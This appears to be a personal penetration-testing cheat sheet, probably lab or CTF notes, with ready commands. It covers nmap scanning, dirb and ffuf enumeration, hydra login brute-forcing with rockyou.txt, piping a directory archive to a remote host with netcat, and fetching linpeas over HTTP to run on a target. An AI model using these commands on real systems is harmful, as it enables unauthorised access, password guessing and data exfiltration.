## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 5000 -oN nmap_output.txt <host>
```

## Directory enumeration with `dirb`:
```bash
dirb http://<host>/
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<host> -H "Host: FUZZ.<host>" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Login brute-force with `hyra`:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc <host> 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Download and serve `linpeas`
### Sender:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Receiver
```bash
cd /tmp
wget <host>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
